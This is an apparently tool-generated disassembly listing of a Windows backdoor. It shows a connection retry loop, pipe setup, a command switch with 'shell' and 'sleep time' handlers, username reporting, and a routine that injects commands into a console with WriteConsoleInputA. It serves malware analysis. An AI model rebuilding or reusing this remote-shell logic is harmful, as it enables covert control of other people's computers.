.text:004014A2 mov     [ebp+var_4], ebx ; 4 Flows to: 5
.text:004014A5
.text:004014A5 loc_4014A5:             ; 5
.text:004014A5 lea     ecx, [ebp+var_54]
.text:004014A8 call    sub_4010C0      ; 5
.text:004014AD cmp     eax, ebx        ; 5
.text:004014AF jnz     short loc_4014CA ; 5 Flows to: 6, 7
.text:004014B1 lea     ecx, [ebp+var_54] ; 6
.text:004014B4 call    sub_4013CC      ; 6
.text:004014B9 push    0EA60h          ; 6
.text:004014BE inc     edi             ; 6
.text:004014BF call    ds:Sleep        ; 6
.text:004014C5 cmp     edi, 5          ; 6
.text:004014C8 jb      short loc_4014A5 ; 6 Flows to: 7, 5
.text:004014CA
.text:004014CA loc_4014CA:             ; 7
.text:004014CA cmp     edi, 5
.text:004014CD jz      loc_401877      ; 7 Flows to: 8, 61
.text:004014D3 push    10000h          ; 8
.text:004014D8 call    ??2@YAPAXI@Z    ; 8
.text:004014DD mov     edi, eax        ; 8
.text:004014DF mov     [esp+27Ch+var_27C], 1000h ; 8
.text:004014E6 mov     [ebp+Dest], edi ; 8
.text:004014E9 call    ??2@YAPAXI@Z    ; 8
.text:004014EE cmp     edi, ebx        ; 8
.text:004014F0 pop     ecx             ; 8
.text:004014F1 mov     [ebp+Str2], eax ; 8
.text:004014F4 jz      loc_401877      ; 8 Flows to: 9, 61
.text:004014FA cmp     eax, ebx        ; 9
.text:004014FC jz      loc_401877      ; 9 Flows to: 10, 61
.text:00401502 push    200h            ; 10
.text:00401507 call    ??2@YAPAXI@Z    ; 10
.text:0040150C cmp     eax, ebx        ; 10
.text:0040150E pop     ecx             ; 10
.text:0040150F mov     [ebp+Str], eax  ; 10
.text:00401512 jz      loc_401877      ; 10 Flows to: 11, 61
.text:00401518 lea     eax, [ebp+PipeAttributes] ; 11
.text:0040151B push    ebx             ; 11
.text:0040151C push    eax             ; 11
.text:0040151D lea     eax, [ebp+hWritePipe] ; 11
.text:00401520 push    eax             ; 11
.text:00401521 lea     eax, [ebp+hReadPipe] ; 11
.text:00401524 push    eax             ; 11
.text:00401525 mov     [ebp+PipeAttributes.nLength], 0Ch ; 11
.text:0040152C mov     [ebp+PipeAttributes.bInheritHandle], 1 ; 11
.text:00401533 mov     [ebp+PipeAttributes.lpSecurityDescriptor], ebx ; 11
.text:00401536 call    ds:CreatePipe   ; 11
.text:0040153C test    eax, eax        ; 11
.text:0040153E jz      loc_401877      ; 11 Flows to: 12, 61
.text:00401544 lea     eax, [ebp+Buffer] ; 12
.text:0040154A push    104h            ; 12
.text:0040154F push    eax             ; 12
.text:00401550 call    ds:GetWindowsDirectoryA ; 12
.text:00401556 lea     eax, [ebp+Buffer] ; 12
.text:0040155C push    offset aTasks   ; 12
.text:00401561 push    eax             ; 12
.text:00401562 call    strcat          ; 12
.text:00401567 pop     ecx             ; 12
.text:00401568 lea     eax, [ebp+Buffer] ; 12
.text:0040156E pop     ecx             ; 12
.text:0040156F push    eax             ; 12
.text:00401570 call    ds:SetCurrentDirectoryA ; 12
.text:00401576 push    esi             ; 12
.text:00401577 push    offset aSConnected ; 12
.text:0040157C push    edi             ; 12
.text:0040157D call    ds:sprintf      ; 12
.text:00401583 push    edi             ; 12
.text:00401584 call    strlen          ; 12
.text:00401589 add     esp, 10h        ; 12 Flows to: 13
.text:0040158C
.text:0040158C loc_40158C:             ; 13 Flows to: 14
.text:0040158C mov     esi, eax
.text:0040158E
.text:0040158E loc_40158E:             ; 14
.text:0040158E xor     edi, edi
.text:00401590 cmp     dword_405900, ebx ; 14
.text:00401596 jz      short loc_4015AF ; 14 Flows to: 15, 17
.text:00401598 cmp     esi, ebx        ; 15
.text:0040159A jnz     short loc_4015AF ; 15 Flows to: 16, 17
.text:0040159C push    [ebp+var_20]    ; 16
.text:0040159F push    [ebp+Dest]      ; 16
.text:004015A2 push    [ebp+hReadPipe] ; 16
.text:004015A5 call    sub_401B7F      ; 16
.text:004015AA add     esp, 0Ch        ; 16
.text:004015AD mov     esi, eax        ; 16 Flows to: 17
.text:004015AF
.text:004015AF loc_4015AF:             ; 17
.text:004015AF cmp     [ebp+var_24], ebx
.text:004015B2 jnz     short loc_4015E1 ; 17 Flows to: 18, 21
.text:004015B4 cmp     dword_405900, ebx ; 18
.text:004015BA jnz     short loc_4015E1 ; 18 Flows to: 19, 21
.text:004015BC cmp     esi, ebx        ; 19
.text:004015BE jnz     short loc_4015E1 ; 19 Flows to: 20, 21
.text:004015C0 push    offset asc_4050CC ; 20
.text:004015C5 push    [ebp+Dest]      ; 20
.text:004015C8 call    strcpy          ; 20
.text:004015CD push    [ebp+Dest]      ; 20
.text:004015D0 call    strlen          ; 20
.text:004015D5 add     esp, 0Ch        ; 20
.text:004015D8 mov     esi, eax        ; 20
.text:004015DA mov     [ebp+var_24], 1 ; 20 Flows to: 21
.text:004015E1
.text:004015E1 loc_4015E1:             ; 21
.text:004015E1 push    esi
.text:004015E2 lea     ecx, [ebp+var_54] ; 21
.text:004015E5 push    [ebp+Dest]      ; 21
.text:004015E8 call    sub_4012C5      ; 21
.text:004015ED test    eax, eax        ; 21
.text:004015EF jnz     short loc_401604 ; 21 Flows to: 22, 24
.text:004015F1 push    7530h           ; 22
.text:004015F6 inc     edi             ; 22
.text:004015F7 call    ds:Sleep        ; 22
.text:004015FD cmp     edi, 5          ; 22
.text:00401600 jbe     short loc_4015E1 ; 22 Flows to: 23, 21
.text:00401602 jmp     short loc_40160E ; 23 Flows to: 25
.text:00401604
.text:00401604 loc_401604:             ; 24 Flows to: 25
.text:00401604 mov     dword_405918, 1
.text:0040160E
.text:0040160E loc_40160E:             ; 25
.text:0040160E cmp     edi, 5
.text:00401611 ja      loc_401877      ; 25 Flows to: 26, 61
.text:00401617 lea     eax, [ebp+dwNumberOfBytesRead] ; 26
.text:0040161A lea     ecx, [ebp+var_54] ; 26
.text:0040161D push    eax             ; 26
.text:0040161E push    1000h           ; 26
.text:00401623 push    [ebp+Str2]      ; 26
.text:00401626 xor     esi, esi        ; 26
.text:00401628 call    sub_40138F      ; 26
.text:0040162D test    eax, eax        ; 26
.text:0040162F jz      loc_40158E      ; 26 Flows to: 27, 14
.text:00401635
.text:00401635 loc_401635:             ; 27
.text:00401635 add     esi, [ebp+dwNumberOfBytesRead]
.text:00401638 cmp     [ebp+dwNumberOfBytesRead], ebx ; 27
.text:0040163B jz      short loc_401658 ; 27 Flows to: 28, 29
.text:0040163D lea     eax, [ebp+dwNumberOfBytesRead] ; 28
.text:00401640 lea     ecx, [ebp+var_54] ; 28
.text:00401643 push    eax             ; 28
.text:00401644 mov     eax, [ebp+Str2] ; 28
.text:00401647 add     eax, esi        ; 28
.text:00401649 push    1000h           ; 28
.text:0040164E push    eax             ; 28
.text:0040164F call    sub_40138F      ; 28
.text:00401654 test    eax, eax        ; 28
.text:00401656 jnz     short loc_401635 ; 28 Flows to: 29, 27
.text:00401658
.text:00401658 loc_401658:             ; 29
.text:00401658 cmp     esi, ebx
.text:0040165A jz      loc_40158E      ; 29 Flows to: 30, 14
.text:00401660 mov     eax, [ebp+Str2] ; 30
.text:00401663 push    eax             ; 30
.text:00401664 push    offset Str1     ; 30
.text:00401669 mov     [esi+eax], bl   ; 30
.text:0040166C call    ds:_strcmpi     ; 30
.text:00401672 pop     ecx             ; 30
.text:00401673 test    eax, eax        ; 30
.text:00401675 pop     ecx             ; 30
.text:00401676 jz      loc_401877      ; 30 Flows to: 31, 61
.text:0040167C mov     eax, [ebp+Dest] ; 31
.text:0040167F mov     esi, [ebp+Str2] ; 31
.text:00401682 mov     [ebp+var_24], ebx ; 31
.text:00401685 mov     [ebp+var_20], 1 ; 31
.text:0040168C mov     [eax], bl       ; 31
.text:0040168E jmp     short loc_401693 ; 31 Flows to: 33
.text:00401690
.text:00401690 loc_401690:             ; 32 Flows to: 33
.text:00401690 mov     esi, [ebp+var_2C]
.text:00401693
.text:00401693 loc_401693:             ; 33
.text:00401693 push    esi
.text:00401694 call    sub_401A0C      ; 33
.text:00401699 push    esi             ; 33
.text:0040169A mov     [ebp+var_2C], eax ; 33
.text:0040169D push    [ebp+Str]       ; 33
.text:004016A0 call    strcpy          ; 33
.text:004016A5 add     esp, 0Ch        ; 33
.text:004016A8 cmp     [esi], bl       ; 33
.text:004016AA jz      short loc_4016E0 ; 33 Flows to: 34, 38
.text:004016AC push    20h             ; 34
.text:004016AE push    ebx             ; 34
.text:004016AF push    esi             ; 34
.text:004016B0 xor     edi, edi        ; 34
.text:004016B2 call    sub_401A4F      ; 34
.text:004016B7 add     esp, 0Ch        ; 34
.text:004016BA mov     esi, offset aShell ; 34 Flows to: 35
.text:004016BF
.text:004016BF loc_4016BF:             ; 35
.text:004016BF push    Str2
.text:004016C5 push    esi             ; 35
.text:004016C6 call    ds:_strcmpi     ; 35
.text:004016CC pop     ecx             ; 35
.text:004016CD test    eax, eax        ; 35
.text:004016CF pop     ecx             ; 35
.text:004016D0 jz      short loc_4016EF ; 35 Flows to: 36, 40
.text:004016D2 add     esi, 8          ; 36
.text:004016D5 inc     edi             ; 36
.text:004016D6 cmp     esi, (offset aSleepTime+8) ; 36
.text:004016DC jl      short loc_4016BF ; 36 Flows to: 37, 35
.text:004016DE jmp     short loc_4016EF ; 37 Flows to: 40
.text:004016E0
.text:004016E0 loc_4016E0:             ; 38
.text:004016E0 cmp     dword_405900, ebx
.text:004016E6 jz      loc_401801      ; 38 Flows to: 39, 54
.text:004016EC or      edi, 0FFFFFFFFh ; 39 Flows to: 40
.text:004016EF
.text:004016EF loc_4016EF:             ; 40
.text:004016EF cmp     edi, 9
.text:004016F2 ja      loc_4017C9      ; 40 Flows to: 41, 50
.text:004016F8 jmp     ds:off_40191E[edi*4] ; 41 Flows to: 56
.text:004016FF
.text:004016FF loc_4016FF:             ; 42
.text:004016FF push    [ebp+hWritePipe]
.text:00401702 push    [ebp+Dest]      ; 42
.text:00401705 call    sub_401C5D      ; 42
.text:0040170A jmp     loc_4017FF      ; 42 Flows to: 53
.text:0040170F
.text:0040170F loc_40170F:             ; 43
.text:0040170F lea     eax, [ebp+var_54]
.text:00401712 push    eax             ; 43
.text:00401713 push    [ebp+Dest]      ; 43
.text:00401716 call    sub_401ED9      ; 43
.text:0040171B jmp     loc_4017FF      ; 43 Flows to: 53
.text:00401720
.text:00401720 loc_401720:             ; 44
.text:00401720 lea     eax, [ebp+var_54]
.text:00401723 push    eax             ; 44
.text:00401724 push    [ebp+Dest]      ; 44
.text:00401727 call    sub_4021F9      ; 44
.text:0040172C jmp     loc_4017FF      ; 44 Flows to: 53
.text:00401731
.text:00401731 loc_401731:             ; 45
.text:00401731 mov     eax, [ebp+arg_0]
.text:00401734 push    ebx             ; 45
.text:00401735 push    ebx             ; 45
.text:00401736 mov     dword_4058F4, eax ; 45
.text:0040173B push    [ebp+Dest]      ; 45
.text:0040173E push    offset StartAddress ; 45
.text:00401743 push    ebx             ; 45
.text:00401744 push    ebx             ; 45
.text:00401745 call    ds:CreateThread ; 45
.text:0040174B mov     esi, eax        ; 45
.text:0040174D push    0FFFFFFFFh      ; 45
.text:0040174F push    esi             ; 45
.text:00401750 call    ds:WaitForSingleObject ; 45
.text:00401756 push    esi             ; 45
.text:00401757 call    ds:CloseHandle  ; 45
.text:0040175D jmp     loc_401801      ; 45 Flows to: 54
.text:00401762
.text:00401762 loc_401762:             ; 46
.text:00401762 lea     eax, [ebp+var_54]
.text:00401765 push    eax             ; 46
.text:00401766 push    [ebp+Dest]      ; 46
.text:00401769 call    sub_402637      ; 46
.text:0040176E jmp     loc_4017FF      ; 46 Flows to: 53
.text:00401773
.text:00401773 loc_401773:             ; 47
.text:00401773 lea     eax, [ebp+nSize]
.text:00401776 mov     [ebp+nSize], 101h ; 47
.text:0040177D push    eax             ; 47
.text:0040177E lea     eax, [ebp+NameBuffer] ; 47
.text:00401784 push    eax             ; 47
.text:00401785 push    2               ; 47
.text:00401787 call    GetUserNameExA  ; 47
.text:0040178C lea     eax, [ebp+NameBuffer] ; 47
.text:00401792 push    eax             ; 47
.text:00401793 push    [ebp+Dest]      ; 47
.text:00401796 call    strcat          ; 47
.text:0040179B push    offset asc_4050A0 ; 47
.text:004017A0 push    [ebp+Dest]      ; 47
.text:004017A3 call    strcat          ; 47
.text:004017A8 add     esp, 10h        ; 47
.text:004017AB jmp     short loc_401801 ; 47 Flows to: 54
.text:004017AD
.text:004017AD loc_4017AD:             ; 48
.text:004017AD lea     eax, [ebp+var_54]
.text:004017B0 push    eax             ; 48
.text:004017B1 push    [ebp+Dest]      ; 48
.text:004017B4 call    sub_40279A      ; 48
.text:004017B9 jmp     short loc_4017FF ; 48 Flows to: 53
.text:004017BB
.text:004017BB loc_4017BB:             ; 49
.text:004017BB lea     eax, [ebp+var_54]
.text:004017BE push    eax             ; 49
.text:004017BF push    [ebp+Dest]      ; 49
.text:004017C2 call    sub_4027D8      ; 49
.text:004017C7 jmp     short loc_4017FF ; 49 Flows to: 53
.text:004017C9
.text:004017C9 loc_4017C9:             ; 50
.text:004017C9 cmp     dword_405900, ebx
.text:004017CF jz      short loc_4017F2 ; 50 Flows to: 51, 52
.text:004017D1 push    offset asc_4050A0 ; 51
.text:004017D6 push    [ebp+Str]       ; 51
.text:004017D9 call    strcat          ; 51
.text:004017DE push    [ebp+Str]       ; 51
.text:004017E1 call    sub_401946      ; 51
.text:004017E6 add     esp, 0Ch        ; 51
.text:004017E9 mov     [ebp+var_20], 1 ; 51
.text:004017F0 jmp     short loc_401801 ; 51 Flows to: 54
.text:004017F2
.text:004017F2 loc_4017F2:             ; 52
.text:004017F2 push    offset aStartShellFirs
.text:004017F7 push    [ebp+Dest]      ; 52
.text:004017FA call    strcat          ; 52 Flows to: 53
.text:004017FF
.text:004017FF loc_4017FF:             ; 53
.text:004017FF pop     ecx
.text:00401800 pop     ecx             ; 53 Flows to: 54
.text:00401801
.text:00401801 loc_401801:             ; 54
.text:00401801 mov     eax, [ebp+var_2C]
.text:00401804 cmp     [eax], bl       ; 54
.text:00401806 jnz     loc_401690      ; 54 Flows to: 55, 32 Flows to: 33
.text:0040180C push    [ebp+Dest]      ; 55
.text:0040180F call    strlen          ; 55
.text:00401814 pop     ecx             ; 55
.text:00401815 jmp     loc_40158C      ; 55 Flows to: 13 Flows to: 14
.text:0040181A
.text:0040181A loc_40181A:             ; 56
.text:0040181A push    offset aSleepTime
.text:0040181F lea     ecx, [ebp+var_54] ; 56
.text:00401822 call    sub_4013A7      ; 56 Flows to: 57
.text:00401827
.text:00401827 loc_401827:             ; 57
.text:00401827 push    offset WindowName
.text:0040182C lea     ecx, [ebp+var_54] ; 57
.text:0040182F call    sub_4013A7      ; 57
.text:00401834 lea     eax, [ebp+dwNumberOfBytesRead] ; 57
.text:00401837 lea     ecx, [ebp+var_54] ; 57
.text:0040183A push    eax             ; 57
.text:0040183B push    1000h           ; 57
.text:00401840 push    [ebp+Str2]      ; 57
.text:00401843 call    sub_40138F      ; 57
.text:00401848 mov     eax, [ebp+dwNumberOfBytesRead] ; 57
.text:0040184B cmp     eax, ebx        ; 57
.text:0040184D jz      short loc_401827 ; 57 Flows to: 58, 57
.text:0040184F mov     ecx, [ebp+Str2] ; 58
.text:00401852 push    ecx             ; 58
.text:00401853 mov     [eax+ecx], bl   ; 58
.text:00401856 call    ds:atoi         ; 58
.text:0040185C cmp     eax, ebx        ; 58
.text:0040185E pop     ecx             ; 58
.text:0040185F mov     [ebp+nSize], eax ; 58
.text:00401862 jz      short loc_401869 ; 58 Flows to: 59, 60
.text:00401864 mov     dword_4056B8, eax ; 59 Flows to: 60
.text:00401869
.text:00401869 loc_401869:             ; 60
.text:00401869 lea     eax, [ebp+var_54]
.text:0040186C push    eax             ; 60
.text:0040186D push    [ebp+Dest]      ; 60
.text:00401870 call    sub_4025CE      ; 60
.text:00401875 pop     ecx             ; 60
.text:00401876 pop     ecx             ; 60 Flows to: 61
.text:00401877
.text:00401877 loc_401877:             ; 61
.text:00401877 cmp     dword_405900, ebx
.text:0040187D jz      short loc_40189A ; 61 Flows to: 62, 63
.text:0040187F push    ebx             ; 62
.text:00401880 push    Dst             ; 62
.text:00401886 call    ds:TerminateProcess ; 62
.text:0040188C push    0FFFFFFFFh      ; 62
.text:0040188E push    Dst             ; 62
.text:00401894 call    ds:WaitForSingleObject ; 62 Flows to: 63
.text:0040189A
.text:0040189A loc_40189A:             ; 63
.text:0040189A lea     ecx, [ebp+var_54]
.text:0040189D call    sub_4013CC      ; 63
.text:004018A2 cmp     [ebp+Dest], ebx ; 63
.text:004018A5 jz      short loc_4018B0 ; 63 Flows to: 64, 65
.text:004018A7 push    [ebp+Dest]      ; 64
.text:004018AA call    ??3@YAXPAX@Z    ; 64
.text:004018AF pop     ecx             ; 64 Flows to: 65
.text:004018B0
.text:004018B0 loc_4018B0:             ; 65
.text:004018B0 cmp     [ebp+Str2], ebx
.text:004018B3 jz      short loc_4018BE ; 65 Flows to: 66, 67
.text:004018B5 push    [ebp+Str2]      ; 66
.text:004018B8 call    ??3@YAXPAX@Z    ; 66
.text:004018BD pop     ecx             ; 66 Flows to: 67
.text:004018BE
.text:004018BE loc_4018BE:             ; 67
.text:004018BE push    [ebp+var_28]
.text:004018C1 call    ??3@YAXPAX@Z    ; 67
.text:004018C6 cmp     [ebp+Str], ebx  ; 67
.text:004018C9 pop     ecx             ; 67
.text:004018CA jz      short loc_4018D5 ; 67 Flows to: 68, 69
.text:004018CC push    [ebp+Str]       ; 68
.text:004018CF call    ??3@YAXPAX@Z    ; 68
.text:004018D4 pop     ecx             ; 68 Flows to: 69
.text:004018D5
.text:004018D5 loc_4018D5:             ; 69
.text:004018D5 push    Dst
.text:004018DB mov     esi, ds:CloseHandle ; 69
.text:004018E1 call    esi ; CloseHandle ; 69
.text:004018E3 push    dword_4058D4    ; 69
.text:004018E9 call    esi ; CloseHandle ; 69
.text:004018EB cmp     [ebp+hReadPipe], 0FFFFFFFFh ; 69
.text:004018EF jz      short loc_4018F6 ; 69 Flows to: 70, 71
.text:004018F1 push    [ebp+hReadPipe] ; 70
.text:004018F4 call    esi ; CloseHandle ; 70 Flows to: 71
.text:004018F6
.text:004018F6 loc_4018F6:             ; 71
.text:004018F6 cmp     [ebp+hWritePipe], 0FFFFFFFFh
.text:004018FA jz      short loc_401901 ; 71 Flows to: 72, 73
.text:004018FC push    [ebp+hWritePipe] ; 72
.text:004018FF call    esi ; CloseHandle ; 72 Flows to: 73
.text:00401901
.text:00401901 loc_401901:             ; 73
.text:00401901 or      [ebp+var_4], 0FFFFFFFFh
.text:00401905 lea     ecx, [ebp+var_54] ; 73
.text:00401908 call    sub_401078      ; 73 Flows to: 74
.text:0040190D
.text:0040190D loc_40190D:             ; 74
.text:0040190D mov     ecx, [ebp+var_C]
.text:00401910 pop     edi             ; 74
.text:00401911 pop     esi             ; 74
.text:00401912 xor     eax, eax        ; 74
.text:00401914 pop     ebx             ; 74
.text:00401915 mov     large fs:0, ecx ; 74
.text:0040191C leave                   ; 74
.text:0040191D retn                    ; 74
.text:0040191D sub_401406 endp
.text:0040191D
.text:0040191E off_40191E dd offset loc_4016FF ; jump table for switch statement
.text:0040191E dd offset loc_40170F
.text:0040191E dd offset loc_401720
.text:0040191E dd offset loc_401731
.text:0040191E dd offset loc_401731
.text:0040191E dd offset loc_401762
.text:0040191E dd offset loc_401773
.text:0040191E dd offset loc_40181A
.text:0040191E dd offset loc_4017AD
.text:0040191E dd offset loc_4017BB
.text:00401946
.text:00401946
.text:00401946 ; Attributes: bp-based frame
.text:00401946
.text:00401946 ; int __cdecl sub_401946(char *Str)
.text:00401946 sub_401946 proc near
.text:00401946
.text:00401946 NumberOfEventsWritten= dword ptr -0Ch
.text:00401946 hConsoleInput= dword ptr -8
.text:00401946 lpBuffer= dword ptr -4
.text:00401946 Str= dword ptr  8
.text:00401946
.text:00401946 push    ebp             ; 1
.text:00401947 mov     ebp, esp        ; 1
.text:00401949 sub     esp, 0Ch        ; 1
.text:0040194C push    ebx             ; 1
.text:0040194D xor     ebx, ebx        ; 1
.text:0040194F cmp     [ebp+Str], ebx  ; 1
.text:00401952 jz      loc_401A09      ; 1 Flows to: 2, 7
.text:00401958 push    [ebp+Str]       ; 2
.text:0040195B call    strlen          ; 2
.text:00401960 test    eax, eax        ; 2
.text:00401962 pop     ecx             ; 2
.text:00401963 jz      loc_401A09      ; 2 Flows to: 3, 7
.text:00401969 push    esi             ; 3
.text:0040196A push    edi             ; 3
.text:0040196B push    ebx             ; 3
.text:0040196C push    ebx             ; 3
.text:0040196D push    3               ; 3
.text:0040196F push    ebx             ; 3
.text:00401970 push    3               ; 3
.text:00401972 push    0C0000000h      ; 3
.text:00401977 push    offset FileName ; 3
.text:0040197C call    ds:CreateFileA  ; 3
.text:00401982 push    [ebp+Str]       ; 3
.text:00401985 mov     [ebp+hConsoleInput], eax ; 3
.text:00401988 call    strlen          ; 3
.text:0040198D mov     edi, eax        ; 3
.text:0040198F mov     [ebp+NumberOfEventsWritten], ebx ; 3
.text:00401992 lea     esi, [edi+edi*4] ; 3
.text:00401995 shl     esi, 2          ; 3
.text:00401998 push    esi             ; 3
.text:00401999 call    ??2@YAPAXI@Z    ; 3
.text:0040199E push    esi             ; 3
.text:0040199F push    ebx             ; 3
.text:004019A0 push    eax             ; 3
.text:004019A1 mov     [ebp+lpBuffer], eax ; 3
.text:004019A4 call    memset          ; 3
.text:004019A9 add     esp, 14h        ; 3
.text:004019AC xor     ecx, ecx        ; 3
.text:004019AE cmp     edi, ebx        ; 3
.text:004019B0 jbe     short loc_4019E4 ; 3 Flows to: 4, 6
.text:004019B2 mov     eax, [ebp+lpBuffer] ; 4
.text:004019B5 push    1               ; 4
.text:004019B7 add     eax, 8          ; 4
.text:004019BA pop     edx             ; 4 Flows to: 5
.text:004019BB
.text:004019BB loc_4019BB:             ; 5
.text:004019BB mov     esi, [ebp+Str]
.text:004019BE mov     [eax-8], dx     ; 5
.text:004019C2 mov     [eax-4], edx    ; 5
.text:004019C5 mov     [eax], dx       ; 5
.text:004019C8 mov     [eax+2], bx     ; 5
.text:004019CC mov     [eax+4], bx     ; 5
.text:004019D0 movsx   si, byte ptr [ecx+esi] ; 5
.text:004019D5 mov     [eax+6], si     ; 5
.text:004019D9 mov     [eax+8], ebx    ; 5
.text:004019DC inc     ecx             ; 5
.text:004019DD add     eax, 14h        ; 5
.text:004019E0 cmp     ecx, edi        ; 5
.text:004019E2 jb      short loc_4019BB ; 5 Flows to: 6, 5
.text:004019E4
.text:004019E4 loc_4019E4:             ; 6
.text:004019E4 lea     eax, [ebp+NumberOfEventsWritten]
.text:004019E7 push    eax             ; 6
.text:004019E8 push    edi             ; 6
.text:004019E9 push    [ebp+lpBuffer]  ; 6
.text:004019EC push    [ebp+hConsoleInput] ; 6
.text:004019EF call    ds:WriteConsoleInputA ; 6
.text:004019F5 push    [ebp+lpBuffer]  ; 6
.text:004019F8 call    ??3@YAXPAX@Z    ; 6
.text:004019FD pop     ecx             ; 6
.text:004019FE push    [ebp+hConsoleInput] ; 6
.text:00401A01 call    ds:CloseHandle  ; 6
.text:00401A07 pop     edi             ; 6
.text:00401A08 pop     esi             ; 6 Flows to: 7
.text:00401A09
.text:00401A09 loc_401A09:             ; 7
.text:00401A09 pop     ebx
.text:00401A0A leave                   ; 7
.text:00401A0B retn                    ; 7
.text:00401A0B sub_401946 endp
.text:00401A0B
.text:00401A0C
.text:00401A0C
.text:00401A0C
.text:00401A0C ; int __cdecl sub_401A0C(char *Str)
.text:00401A0C sub_401A0C proc near
.text:00401A0C
.text:00401A0C Str= dword ptr  4
.text:00401A0C
.text:00401A0C push    edi             ; 1
.text:00401A0D mov     edi, [esp+4+Str] ; 1
.text:00401A11 test    edi, edi        ; 1
.text:00401A13 jnz     short loc_401A19 ; 1 Flows to: 2, 3
.text:00401A15 xor     eax, eax        ; 2
.text:00401A17 pop     edi             ; 2
.text:00401A18 retn                    ; 2 Flows to: 3
.text:00401A19
.text:00401A19 loc_401A19:             ; 3
.text:00401A19 push    esi
.text:00401A1A push    edi             ; 3
.text:00401A1B xor     esi, esi        ; 3
.text:00401A1D call    strlen          ; 3
.text:00401A22 test    eax, eax        ; 3
.text:00401A24 pop     ecx             ; 3
.text:00401A25 jbe     short loc_401A3D ; 3 Flows to: 4, 8
.text:00401A27
.text:00401A27 loc_401A27:             ; 4
.text:00401A27 mov     cl, [esi+edi]
.text:00401A2A test    cl, cl          ; 4
.text:00401A2C jz      short loc_401A3D ; 4 Flows to: 5, 8
.text:00401A2E cmp     cl, 0Dh         ; 5
.text:00401A31 jz      short loc_401A3D ; 5 Flows to: 6, 8
.text:00401A33 cmp     cl, 0Ah         ; 6
.text:00401A36 jz      short loc_401A3D ; 6 Flows to: 7, 8
.text:00401A38 inc     esi             ; 7
.text:00401A39 cmp     esi, eax        ; 7
.text:00401A3B jb      short loc_401A27 ; 7 Flows to: 8, 4
.text:00401A3D
.text:00401A3D loc_401A3D:             ; 8
.text:00401A3D cmp     byte ptr [esi+edi], 0Dh
.text:00401A41 jnz     short loc_401A49 ; 8 Flows to: 9, 10
.text:00401A43 and     byte ptr [esi+edi], 0 ; 9
.text:00401A47 inc     esi             ; 9
.text:00401A48 inc     esi             ; 9 Flows to: 10
.text:00401A49
.text:00401A49 loc_401A49:             ; 10
.text:00401A49 lea     eax, [esi+edi]
.text:00401A4C pop     esi             ; 10
.text:00401A4D pop     edi             ; 10
.text:00401A4E retn                    ; 10
.text:00401A4E sub_401A0C endp
.text:00401A4E
.text:00401A4F
.text:00401A4F
.text:00401A4F ; Attributes: bp-based frame
.text:00401A4F
.text:00401A4F ; int __cdecl sub_401A4F(char *Str, int, char)
.text:00401A4F sub_401A4F proc near
.text:00401A4F
.text:00401A4F var_8= dword ptr -8
.text:00401A4F var_4= dword ptr -4
.text:00401A4F Str= dword ptr  8
.text:00401A4F arg_4= dword ptr  0Ch
.text:00401A4F arg_8= byte ptr  10h
.text:00401A4F
.text:00401A4F push    ebp             ; 1
.text:00401A50 mov     ebp, esp        ; 1
.text:00401A52 push    ecx             ; 1
.text:00401A53 push    ecx             ; 1
.text:00401A54 mov     eax, [ebp+arg_4] ; 1
.text:00401A57 push    ebx             ; 1
.text:00401A58 push    esi             ; 1
.text:00401A59 xor     esi, esi        ; 1
.text:00401A5B cmp     eax, esi        ; 1
.text:00401A5D push    edi             ; 1
.text:00401A5E mov     [ebp+var_8], esi ; 1
.text:00401A61 mov     [ebp+var_4], esi ; 1
.text:00401A64 jnz     short loc_401A6F ; 1 Flows to: 2, 3
.text:00401A66 push    [ebp+Str]       ; 2
.text:00401A69 call    strlen          ; 2
.text:00401A6E pop     ecx             ; 2 Flows to: 3
.text:00401A6F
.text:00401A6F loc_401A6F:             ; 3
.text:00401A6F mov     bl, [ebp+arg_8]
.text:00401A72 mov     [ebp+arg_4], eax ; 3
.text:00401A75 push    8               ; 3
.text:00401A77 mov     edx, offset Str2 ; 3
.text:00401A7C xor     eax, eax        ; 3
.text:00401A7E pop     ecx             ; 3
.text:00401A7F cmp     [ebp+arg_4], eax ; 3
.text:00401A82 mov     edi, edx        ; 3
.text:00401A84 rep stosd               ; 3
.text:00401A86 jbe     short loc_401ADE ; 3 Flows to: 4, 14
.text:00401A88
.text:00401A88 loc_401A88:             ; 4
.text:00401A88 mov     edi, [ebp+Str]
.text:00401A8B mov     cl, [esi+edi]   ; 4
.text:00401A8E lea     eax, [esi+edi]  ; 4
.text:00401A91 cmp     cl, bl          ; 4
.text:00401A93 jz      short loc_401AAF ; 4 Flows to: 5, 9
.text:00401A95 cmp     [ebp+var_4], 0  ; 5
.text:00401A99 jnz     short loc_401AAF ; 5 Flows to: 6, 9
.text:00401A9B cmp     cl, 22h         ; 6
.text:00401A9E mov     [ebp+var_4], 1  ; 6
.text:00401AA5 jnz     short loc_401AAA ; 6 Flows to: 7, 8
.text:00401AA7 mov     bl, cl          ; 7
.text:00401AA9 inc     esi             ; 7 Flows to: 8
.text:00401AAA
.text:00401AAA loc_401AAA:             ; 8
.text:00401AAA lea     eax, [esi+edi]
.text:00401AAD mov     [edx], eax      ; 8 Flows to: 9
.text:00401AAF
.text:00401AAF loc_401AAF:             ; 9
.text:00401AAF mov     cl, [eax]
.text:00401AB1 cmp     cl, bl          ; 9
.text:00401AB3 jz      short loc_401ABA ; 9 Flows to: 10, 11
.text:00401AB5 cmp     cl, 0Dh         ; 10
.text:00401AB8 jnz     short loc_401AD8 ; 10 Flows to: 11, 13
.text:00401ABA
.text:00401ABA loc_401ABA:             ; 11
.text:00401ABA cmp     [ebp+var_4], 0
.text:00401ABE jz      short loc_401AD8 ; 11 Flows to: 12, 13
.text:00401AC0 and     [ebp+var_4], 0  ; 12
.text:00401AC4 and     byte ptr [eax], 0 ; 12
.text:00401AC7 inc     [ebp+var_8]     ; 12
.text:00401ACA mov     bl, [ebp+arg_8] ; 12
.text:00401ACD add     edx, 4          ; 12
.text:00401AD0 cmp     edx, offset dword_405900 ; 12
.text:00401AD6 jz      short loc_401AE7 ; 12 Flows to: 13, 16
.text:00401AD8
.text:00401AD8 loc_401AD8:             ; 13
.text:00401AD8 inc     esi
.text:00401AD9 cmp     esi, [ebp+arg_4] ; 13
.text:00401ADC jb      short loc_401A88 ; 13 Flows to: 14, 4
.text:00401ADE
.text:00401ADE loc_401ADE:             ; 14
.text:00401ADE mov     eax, [ebp+var_8]
.text:00401AE1 inc     eax             ; 14 Flows to: 15
.text:00401AE2
.text:00401AE2 loc_401AE2:             ; 15
.text:00401AE2 pop     edi
.text:00401AE3 pop     esi             ; 15
.text:00401AE4 pop     ebx             ; 15
.text:00401AE5 leave                   ; 15
.text:00401AE6 retn                    ; 15 Flows to: 16
.text:00401AE7
